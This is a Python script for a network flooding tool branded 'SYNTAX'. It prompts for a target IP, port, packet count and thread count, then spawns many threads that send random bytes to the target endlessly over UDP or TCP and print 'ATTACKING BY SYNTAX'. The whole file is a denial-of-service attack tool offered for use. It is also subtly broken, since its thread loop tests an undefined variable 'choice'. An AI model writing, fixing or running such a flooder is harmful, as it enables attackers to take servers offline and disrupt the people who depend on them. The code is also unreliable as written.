import random
import socket
import threading
import time
import os,sys

os.system("clear")
print("""

\033[34m░██████╗██╗░░░██╗███╗░░██╗████████╗░█████╗░██╗░░██╗
\033[34m██╔════╝╚██╗░██╔╝████╗░██║╚══██╔══╝██╔══██╗╚██╗██╔╝
\033[34m╚█████╗░░╚████╔╝░██╔██╗██║░░░██║░░░███████║░╚███╔╝░
\033[32m░╚═══██╗░░╚██╔╝░░██║╚████║░░░██║░░░██╔══██║░██╔██╗░
\033[32m██████╔╝░░░██║░░░██║░╚███║░░░██║░░░██║░░██║██╔╝╚██╗
\033[32m╚═════╝░░░░╚═╝░░░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝
""")
print("\033[31m━>IP")
ip = str(input("━>\033[0m:"))
time.sleep(1)
print("\033[31m━>Port")
port = int(input("━>\033[0m:"))
time.sleep(1)
print("\033[31m━>Pakets")	
times = int(input("━>\033[0m:"))
time.sleep(1)
print("\033[31m━>Threads")
threads = int(input("━>\033[0m:"))
def run1():
  data = random._urandom(1064)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack!")

def run2():
  data = random._urandom(800)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack!")

def run3():
  data = random._urandom(550)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack!")

def run4():
  data = random._urandom(400)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack!")

def run5():
  data = random._urandom(320)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack!")

def run6():
  data = random._urandom(250)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack!")

def run7():
  data = random._urandom(195)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack!")

def run8():
  data = random._urandom(160)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack!")

def run9():
  data = random._urandom(150)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack!")

def run10():
  data = random._urandom(110)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack!")

def run11():
  data = random._urandom(109)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack!")

def run12():
  data = random._urandom(21)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack!")

def run13():
  data = random._urandom(106)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack!")

def run14():
  data = random._urandom(160)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack!")

def run15():
  data = random._urandom(106)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack!")

def run16():
  data = random._urandom(106)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack!")

def run17():
  data = random._urandom(106)
  i = random.choice(("[•]","[+]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack!")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run1)
    th.start()
    th = threading.Thread(target = run2)
    th.start()
    th = threading.Thread(target = run3)
    th.start()
    th = threading.Thread(target = run4)
    th.start()
    th = threading.Thread(target = run5)
    th.start()
    th = threading.Thread(target = run6)
    th.start()
    th = threading.Thread(target = run7)
    th.start()
    th = threading.Thread(target = run8)
    th.start()
  else:
    th = threading.Thread(target = run9)
    th.start()
    th = threading.Thread(target = run10)
    th.start()
    th = threading.Thread(target = run11)
    th.start()
    th = threading.Thread(target = run12)
    th.start()
    th = threading.Thread(target = run13)
    th.start()
    th = threading.Thread(target = run14)
    th.start()
    th = threading.Thread(target = run15)
    th.start()
    th = threading.Thread(target = run16)
    th.start()
    th = threading.Thread(target = run17)
    th.start()


